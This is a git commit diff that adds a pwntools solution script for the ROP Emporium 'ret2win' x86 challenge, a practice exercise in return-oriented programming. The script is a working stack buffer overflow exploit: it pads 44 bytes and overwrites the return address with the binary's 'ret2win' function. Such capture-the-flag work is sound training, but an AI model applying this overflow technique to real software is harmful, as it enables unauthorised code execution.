f317407763e3681ced19a854d6d889abcffb8eb9
Mikael Kall <Mikael.Kall@kindredgroup.com>
2018-05-22 14:28:14 +0200

    Added ROP_Eporium ret2win solution

--- ROP_Emporium/ret2win/x86/solution.py
+++ ROP_Emporium/ret2win/x86/solution.py
@@ -1,13 +1,18 @@
 #!/usr/bin/env python2
 from pwn import *
-from pygments import highlight
-from pygments.lexers import CLexer
-from pygments.formatters import TerminalFormatter
-
 context(arch='i386', os='linux')
 
 def pwn():
-    pass
+
+    e = ELF("./ret2win32")
+    ret2winaddr = p32(e.symbols["ret2win"])
+
+    ''' Create buffer '''
+    buf = "A" * 44
+
+    io = e.process()
+    io.sendline(buf + ret2winaddr)
+    print(io.recvall())
 
 if __name__ == '__main__':
     pwn()
